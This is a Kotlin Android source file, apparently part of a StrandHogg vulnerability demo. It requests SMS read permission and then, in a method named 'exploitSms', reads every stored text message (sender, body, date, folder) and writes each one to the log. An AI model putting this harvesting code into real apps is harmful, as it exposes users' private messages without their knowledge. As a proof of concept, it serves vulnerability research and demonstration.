package io.kamara.android.strandhogg.demo

import android.Manifest
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.util.Log
import java.util.ArrayList

const val PERMISSION_READ_SMS = Manifest.permission.READ_SMS
const val PERMISSION_REQUEST_READ_SMS = 0
const val TAG = "ReadSmsActivity"

class ReadSmsActivity : BaseActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_read_sms)
    }

    private fun exploitSms() {
        // Check if the read sms permission has been granted
        if (checkSelfPermissionCompat(PERMISSION_READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            // Permission is already available, start sms exploitation
            readAllSms()
        } else {
            // Permission is missing and must be requested.
            requestPermission(PERMISSION_READ_SMS)
        }
    }


    override fun onPermissionGranted() {
        exploitSms()
    }

    override fun requestCode() = PERMISSION_REQUEST_READ_SMS


    private fun readAllSms(): List<Sms> {
        val allSms = ArrayList<Sms>()
        var sms: Sms
        val message = Uri.parse("content://sms/")
        val contentResolver = contentResolver
        val cursor = contentResolver.query(message, null, null, null, null)
        this.startManagingCursor(cursor)
        val totalSMS = cursor!!.count

        if (cursor.moveToFirst()) {
            for (i in 0 until totalSMS) {
                sms = Sms()
                sms.id = cursor.getString(cursor.getColumnIndexOrThrow("_id"))
                sms.address = cursor.getString(
                    cursor.getColumnIndexOrThrow("address")
                )
                sms.msg = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                sms.readState = cursor.getString(cursor.getColumnIndex("read"))
                sms.time = cursor.getString(cursor.getColumnIndexOrThrow("date"))
                if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
                    sms.folderName = "inbox"
                } else {
                    sms.folderName = "sent"
                }
                Log.d(TAG, sms.toString())
                allSms.add(sms)
                cursor.moveToNext()
            }
        }
        cursor.close()
        return allSms
    }
}

class Sms {
    var id: String? = null
    var address: String? = null
    var msg: String? = null
    var readState: String? = null
    var time: String? = null
    var folderName: String? = null

    override fun toString(): String {
        return "Sms(id=$id, address=$address, msg=$msg, readState=$readState, time=$time, folderName=$folderName)"
    }
}